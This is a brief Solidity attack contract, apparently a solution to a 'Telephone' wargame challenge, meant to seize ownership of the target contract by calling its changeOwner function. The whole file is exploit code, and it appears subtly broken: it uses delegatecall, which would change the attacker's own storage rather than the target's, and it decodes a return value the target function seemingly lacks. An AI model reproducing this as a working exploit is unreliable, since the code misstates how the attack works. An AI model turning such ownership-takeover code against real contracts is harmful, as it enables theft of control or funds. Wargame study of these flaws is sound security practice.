// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract AttackTelephone{
    Telephone public co;
    address public o;
    constructor(Telephone add, address own) public {
        co=add;
        o=own;
    }
    function change(address tele)public returns(uint256){
        (bool  success, bytes memory result) = tele.delegatecall(abi.encodeWithSignature("changeOwner(address)", o));
        if(success)
        return abi.decode(result, (uint256));
    }
}

